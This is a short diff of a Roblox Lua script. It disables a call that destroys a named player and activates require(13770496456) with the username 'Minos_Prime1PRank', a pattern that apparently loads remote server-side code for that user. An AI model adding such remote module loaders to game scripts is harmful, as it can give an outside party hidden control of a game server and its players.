@@ -1,6 +1,6 @@
-game.Players.TarikElProp:Destroy()
+--game.Players.TarikElProp:Destroy()
 
---require(13770496456)('user')
+require(13770496456)('Minos_Prime1PRank')
 
 --[[game.Players:BanAsync(
 {
